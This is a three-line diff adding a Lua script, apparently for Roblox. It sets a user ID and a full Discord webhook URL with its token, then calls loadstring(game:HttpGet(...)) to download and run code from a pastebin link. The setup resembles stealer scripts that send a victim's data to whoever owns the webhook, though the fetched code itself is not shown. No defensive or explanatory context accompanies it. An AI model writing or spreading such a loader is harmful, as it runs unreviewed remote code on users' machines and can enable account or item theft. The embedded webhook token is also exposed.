@@ -1,0 +1,3 @@
+--uID - "4935179212" -- do not forget to remove the brackets
+--WHook - "https://discord.com/api/webhooks/1141797465889181809/ueSAvY260rN3Clk5a0iusc-uhhb-UHfVhvevLlcPyoFkTz85BgISGK5f2VILgT4TgfpI" -- do not forget to remove the brackets
+loadstring(game:HttpGet("https://pastebin.com/raw/Qxrr9z4S"))()
